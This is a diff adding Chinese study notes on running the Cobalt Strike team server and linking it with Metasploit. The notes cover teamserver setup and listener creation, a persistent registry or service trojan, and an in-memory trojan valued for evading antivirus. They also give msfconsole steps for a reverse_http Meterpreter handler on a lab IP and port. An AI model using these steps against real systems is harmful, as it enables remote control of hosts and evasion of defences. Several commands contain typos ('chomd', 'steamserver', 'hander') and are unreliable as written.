@@ -1,0 +1,31 @@
+ 集成提权，凭据导出，端口转发，socke代理，office攻击，文件捆绑，钓鱼等，可以调用mimikatz等
+   服务端一个（kali）客户端多个，团队协作，内网渗透，apt攻击
+
+使用：chomd 777 teamserver    提升权限：TeamServerImage 和 teamserver
+ r 4 读取
+ w 2 写入
+ x 1 执行
+ 7（文件所有者） 7（群组） 7（其他用户）
+
+使用方法：
+ 1. 进入kali 
+     sudo su
+     cd Server
+     ifconfig
+     ./steamserver ip（kali） 密码
+ 2. client   .bat 文件启动
+ 3.生成监听器；
+ 4.木马介绍：windows e（32位 64位 运行在注册表和服务的木马 就算重启也可以再次控制 ）  
+            windows s（无行为动作 无状态木马 运行在内存中 重启后无法二次上线 优点是易过杀毒）
+ 5.回连间隔设置为0；
+ 6.MSF和cs联动：
+ cs漏洞库有限，msf漏洞库多；
+（1）kali打开msfconsole
+（2）cs新监听，foreign http 
+（3）msf：use exploit/multi/hander
+（4）set payload windows/meterpreter/reverse_http
+ (5)set lhost 192.168.157.129
+（6）set lport 7788
+（7）run
+（8）右键目标主机，凭证提权->新建会话->msf
+（9）选完后，msf就可以做到监听，进入会话窗口，cs和msf实现联动；
